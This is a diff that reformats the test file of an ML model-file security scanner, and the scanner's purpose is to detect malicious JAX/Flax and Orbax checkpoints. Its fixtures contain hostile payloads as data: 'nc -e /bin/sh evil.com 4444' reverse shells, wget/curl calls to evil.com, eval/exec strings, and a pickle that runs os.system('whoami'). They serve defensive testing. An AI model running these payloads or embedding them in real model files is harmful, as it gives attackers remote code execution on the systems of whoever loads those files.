@@ -31,12 +31,12 @@ class TestJaxFlaxIntegration:
                         "feed_forward": {
                             "intermediate": np.random.normal(0, 0.1, (128, 512)).astype(np.float32).tobytes(),
                             "output": np.random.normal(0, 0.1, (512, 128)).astype(np.float32).tobytes(),
-                        }
+                        },
                     }
                 },
                 "classifier": {
                     "dense": np.random.normal(0, 0.1, (128, 10)).astype(np.float32).tobytes(),
-                }
+                },
             },
             "opt_state": {
                 "step": 5000,
@@ -52,7 +52,7 @@ class TestJaxFlaxIntegration:
                 "vocab_size": 1000,
                 "flax_version": "0.7.5",
                 "jax_version": "0.4.23",
-            }
+            },
         }
 
     def create_malicious_jax_model(self):
@@ -65,26 +65,21 @@ class TestJaxFlaxIntegration:
             },
             "__jax_array__": {
                 "malicious_metadata": "fake_jax_array_implementation",
-                "custom_deserializer": "eval(compile(open('/tmp/backdoor.py').read(), '<string>', 'exec'))"
+                "custom_deserializer": "eval(compile(open('/tmp/backdoor.py').read(), '<string>', 'exec'))",
             },
             "__orbax_metadata__": {
                 "version": "0.1.0",
                 "restore_fn": "lambda x: eval(x) if hasattr(__builtins__, 'eval') else exec(x)",
                 "custom_serializer": "subprocess.run(['wget', 'http://evil.com/backdoor.sh'])",
             },
-            "malicious_tensors": {
-                "negative_dims": {
-                    "shape": [-1, -100, -1000],
-                    "dtype": "malicious_dtype"
-                }
-            },
-            "__tree_flatten__": "lambda: eval('__import__(\"os\").system(\"id\")')",
+            "malicious_tensors": {"negative_dims": {"shape": [-1, -100, -1000], "dtype": "malicious_dtype"}},
+            "__tree_flatten__": 'lambda: eval(\'__import__("os").system("id")\')',
             "model_config": {
-                "custom_activation": "lambda x: eval('__import__(\"os\").system(\"whoami\")') or x",
+                "custom_activation": 'lambda x: eval(\'__import__("os").system("whoami")\') or x',
                 "loss_function": (
-                    "exec('import subprocess; subprocess.call([\"nc\", \"-e\", \"/bin/sh\", \"evil.com\", \"4444\"])')"
+                    'exec(\'import subprocess; subprocess.call(["nc", "-e", "/bin/sh", "evil.com", "4444"])\')'
                 ),
-            }
+            },
         }
 
     def test_clean_flax_model_no_false_positives(self, tmp_path):
@@ -130,14 +125,7 @@ class TestJaxFlaxIntegration:
         # Check for specific threat patterns
         issue_messages = [i.message.lower() for i in critical_issues]
 
-        expected_patterns = [
-            "jax_array",
-            "orbax",
-            "eval",
-            "exec",
-            "subprocess",
-            "negative dimensions"
-        ]
+        expected_patterns = ["jax_array", "orbax", "eval", "exec", "subprocess", "negative dimensions"]
 
         for pattern in expected_patterns:
             assert any(pattern in msg for msg in issue_messages), f"Missing detection of {pattern}"
@@ -169,13 +157,9 @@ class TestJaxFlaxIntegration:
         large_model = {
             "params": {
                 "large_embedding": large_embedding,
-                "classifier": np.random.normal(0, 0.1, (512, 1000)).astype(np.float32).tobytes()
+                "classifier": np.random.normal(0, 0.1, (512, 1000)).astype(np.float32).tobytes(),
             },
-            "metadata": {
-                "model_type": "embedding",
-                "embedding_size": 512,
-                "vocab_size": 100000
-            }
+            "metadata": {"model_type": "embedding", "embedding_size": 512, "vocab_size": 100000},
         }
 
         model_path = tmp_path / "large_model.flax"
@@ -200,11 +184,7 @@ class TestJaxFlaxIntegration:
             "version": "0.1.0",
             "type": "orbax_checkpoint",
             "format": "flax",
-            "model_config": {
-                "architecture": "transformer",
-                "layers": 1,
-                "hidden_size": 128
-            }
+            "model_config": {"architecture": "transformer", "layers": 1, "hidden_size": 128},
         }
 
         # Clean parameter data
@@ -212,7 +192,7 @@ class TestJaxFlaxIntegration:
             "model": {
                 "embeddings": {
                     "vocab_size": 1000,
-                    "weights": np.random.normal(0, 0.1, (1000, 128)).astype(np.float32).tolist()
+                    "weights": np.random.normal(0, 0.1, (1000, 128)).astype(np.float32).tolist(),
                 }
             }
         }
@@ -248,27 +228,14 @@ class TestJaxFlaxIntegration:
             "custom_deserializer": "lambda data: exec('import os; os.system(\"curl http://evil.com/pwned\")')",
             "jax_config": {
                 "host_callback": "jax.experimental.host_callback.call(os.system, 'nc -e /bin/sh evil.com 4444')"
-            }
+            },
         }
 
         with open(orbax_dir / "metadata.json", "w") as f:
             json.dump(malicious_metadata, f)
 
         # Create dangerous pickle file
-        dangerous_pickle = (
-            b"\x80\x03"
-            b"cos\n"
-            b"system\n"
-            b"q\x00"
-            b"X\x06\x00\x00\x00"
-            b"whoami"
-            b"q\x01"
-            b"\x85"
-            b"q\x02"
-            b"R"
-            b"q\x03"
-            b"."
-        )
+        dangerous_pickle = b"\x80\x03cos\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03."
 
         with open(orbax_dir / "checkpoint", "wb") as f:
             f.write(dangerous_pickle)
@@ -294,23 +261,20 @@ class TestJaxFlaxIntegration:
                     "params": {
                         "transformer": {
                             "attention": {"query": b"\x00" * 1000, "key": b"\x00" * 1000},
-                            "feed_forward": {"dense": b"\x00" * 2000}
+                            "feed_forward": {"dense": b"\x00" * 2000},
                         }
                     }
                 },
-                "expected_arch": "transformer"
+                "expected_arch": "transformer",
             },
             {
                 "model": {
                     "params": {
-                        "conv_layers": {
-                            "conv1": b"\x00" * 3000,
-                            "conv2": b"\x00" * 3000
-                        },
-                        "pooling": {"pool1": b"\x00" * 100}
+                        "conv_layers": {"conv1": b"\x00" * 3000, "conv2": b"\x00" * 3000},
+                        "pooling": {"pool1": b"\x00" * 100},
                     }
                 },
-                "expected_arch": "cnn"
+                "expected_arch": "cnn",
             },
             {
                 "model": {
@@ -320,8 +284,8 @@ class TestJaxFlaxIntegration:
                         }
                     }
                 },
-                "expected_arch": ["embedding", "transformer"]  # May be detected as either
-            }
+                "expected_arch": ["embedding", "transformer"],  # May be detected as either
+            },
         ]
 
         for i, test_case in enumerate(test_cases):
@@ -339,8 +303,7 @@ class TestJaxFlaxIntegration:
                 else [test_case["expected_arch"]]
             )
             actual_arch = result.metadata.get("model_architecture")
-            assert actual_arch in expected_archs, \
-                f"Expected one of {expected_archs}, got {actual_arch}"
+            assert actual_arch in expected_archs, f"Expected one of {expected_archs}, got {actual_arch}"
 
     def test_integration_with_cli(self, tmp_path):
         """Test that enhanced JAX/Flax scanning works through CLI."""
